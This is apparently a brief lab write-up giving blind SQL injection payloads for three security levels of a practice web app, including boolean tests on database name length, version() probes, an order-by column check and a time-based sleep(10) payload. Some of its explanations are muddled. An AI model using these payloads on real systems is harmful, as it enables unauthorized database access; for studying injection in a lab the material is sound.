Blind SQL injections rely on finding
implicit true/false outputs based on input
to find vulnerabilities.

### Security level: LOW

* Solution 1: 1' and length(database())=4#
* Solution 2: 1' and version();#
* 1' order by 3# query results in "User ID is MISSING from the databse".
This is a indirect way of saying there are only 2 columns
* Anything other than 1' and length(database())=4# will result in 
the missing error because there are exactly 4 IDs.

### Security level: MEDIUM
* Solution 1: 1 and length(database())=4#
* Solution 2: 1 and version();#

### Security level: HIGH
* Solution: 1' and sleep(10)#
* Recieved "User ID is MISSING from the database" after 10 seconds, meaning it worked.
